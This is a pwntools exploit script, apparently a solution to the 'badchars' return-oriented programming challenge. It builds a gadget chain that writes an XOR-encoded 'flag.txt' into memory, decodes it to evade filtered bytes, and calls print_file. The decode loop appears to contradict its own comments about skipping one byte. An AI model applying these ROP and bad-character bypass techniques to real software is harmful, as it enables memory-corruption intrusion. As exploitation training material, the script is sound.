#!/usr/bin/env python3

import binascii
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

gen = cyclic_gen()
data = gen.get(40)

# 0x78, 0x67, 0x61, 0x2e
bad_chars = ['x', 'g', 'a', '.']

# The data section we'll write to. This is actually the 
# data section + 1. We add one for a really silly reason. 
# We have several bad characters we can't send to the program. One
# of those is the letter 'x', and one of those is the the '.'. This means
# our entire rop chain cannot handle a 'x' or a '.'. 
# For this reason we single-byte XOR encode the filename 
# 'flag.txt' with the letter 'c' (chosen at random).
# This eliminates any bad characters, and we use a gadget to un-xor it in place.
#
# However, there's one really sticky problem, one of the addresses we need to use
# to unencode in is 0x00501028 + 6 which gives us a 0x2e in the last byte. 
# This is would be easily fixed by just not xor-encoding that value, however
# this aligns with the 'x' in our 'flag.txt' string and so both the memory address to
# unxor the 'x' and the 'x' itself are bad characters. 
# The final solve is to shift where we start writing by 1 byte. This places a 't' (goodchar)
# in the bad memory address location, and since 't' is acceptable, we simply don't xor
# encode it.
data_section = 0x00601029

# In this case it this gadget is MOV [r13], r12. r13 is the where r12 is the what.
write_gadget = p64(0x00400634)

# This will pop r12, r13, r14, and r15. This means we need 16 bytes of extra data
# for this to work.
pop_what_where = p64(0x0040069c)

# Useful to set our first parameter.
pop_rdi = p64(0x004006a3)

# Our final function call. This comes from the PLT of badchars.
print_file = p64(0x00400510)


def encode_string(key, string):
    """
    XOR encode a string. 

    This is hardcoded to skip the 6th (index 5) letter.
    """
    out = b""
    for idx, c in enumerate(string):
        if idx == 5:
            # Skip this letter.
            out += ord(c).to_bytes(1, "little", signed=False)
            continue
        out +=  (ord(c) ^ ord(key)).to_bytes(1, "little", signed=False)
    return out

def write_what_where(what, where, extra=0):
    """
    Creates a rop chain that will write 8 bytes to a particular location.
    """
    extra_data = gen.get(extra)
    rop = b""
    rop += pop_what_where
    rop += what
    rop += p64(where)
    rop += extra_data
    rop += write_gadget

    return rop

def xor_byte():
    """
    Creates a ROP chain to un-xor-encode a string in memory.

    TODO: This could be greatly improved. Hardcoded values all
    over the place makes this a mess. In addition, we could 
    skip the 6th letter all together and it would probably
    be safer to do so.
    """
    rop = b""
    xor_instruction = p64(0x00400628) # xor [r15], r14B
    pop_r14_r15 = p64(0x004006a0)
    for x in range(8):
        rop += pop_r14_r15 # pop into r14, r15 ret
        rop += p64(0x63) # The key
        rop += p64(data_section + x) # The first byte
        rop += xor_instruction # Return to the xor instruction


    return rop

# Start the process
p = process("./badchars")

# Encode the flag string, give me back the encoded bytes.
encoded_string = encode_string('c', 'flag.txt')
print(f"Encoded String: {encoded_string.hex()} len: {len(encoded_string)}")


data += write_what_where(encoded_string, data_section, 16) # Write the encoded string
data += xor_byte()  # un-xor-encode the string
data += pop_rdi # Get the string on the stack into rdi
data += p64(data_section) # What will go into rdi
data += p64(0x004006a4) # an extra ret to stack align
data += print_file # Our final call

# Get all the output to begin with.
p.readuntil(b">")

# Fire off the payload.
p.sendline(data)

# Get any output. E.g. the flag.
p.interactive()

